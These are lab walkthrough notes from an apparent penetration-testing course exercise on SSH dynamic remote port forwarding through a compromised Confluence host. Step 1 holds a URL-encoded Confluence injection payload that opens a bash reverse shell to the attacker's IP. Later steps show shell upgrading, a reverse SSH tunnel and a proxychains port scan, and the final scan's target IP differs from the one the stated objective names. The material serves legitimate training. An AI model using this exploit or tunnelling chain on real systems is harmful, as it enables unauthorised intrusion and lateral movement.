# Walk: Port Redirection and SSH Tunneling - SSH Dynamic Remote Port Forwarding - VM Group 1

## Fecha: 23/03/2025
## Host: PGDATABASE01 | CONFLUENCE01 | MULTISERVER03
## IP: 10.4.xxx.215 |  192.168.xxx.63 | 192.168.xxx.64
## Objetivo
Follow the steps in this section to set up a remote dynamic port forward from CONFLUENCE01. Scan ports 9050-9100 on MULTISERVER03 through it. Which port is open? (Note: Make sure to scan MULTISERVER03 on its internal interface at 10.4.X.64).
## Herramientas
1. ssh
2. systemctl
## Procedimiento y comandos
#### Paso 1: Cambiamos el puerto en el payload a 7777
1. Cambiamos 
```
┌──(root㉿kali)-[/home/kali/OffSec/19-PortForwarding-SSHTunneling/19.3.3-SSH-Remote-PortForwarding]
└─# curl -v http://192.168.xxx.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.xxx/7777%200%3E%261%27%29.start%28%29%22%29%7D/
...
```
2. Iniciamos el servicio
`sudo systemctl start ssh`
#### Paso 2: Configuramos el tunel desde _CONFLUENCE_
1. Nos conectamos a CONFLUENCE como en las maquinas anteriores:
```
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
$ ssh -N -R 9998 kali@192.168.45.xxx
ssh -N -R 9998 kali@192.168.45.xxx
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '192.168.45.xxx (192.168.45.xxx)' can't be established.
ECDSA key fingerprint is SHA256:A44ctMNCG48aRHny80MXOphfYTv3LcRjemm+4lxN2gw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
kali@192.168.45.198's password: 
```
#### Paso 3: Obtenemos el flag
1. Desde kali comprobamos la configuracion del tunel:
```
┌──(root㉿kali)-[/home/kali/OffSec/19-PortForwarding-SSHTunneling/19.3.4-SSH-Dynamic-Remote-PortForwarding]
└─# proxychains nmap -vvv -sT -p 9050-9100 -Pn --open 10.4.xxx.215

```   
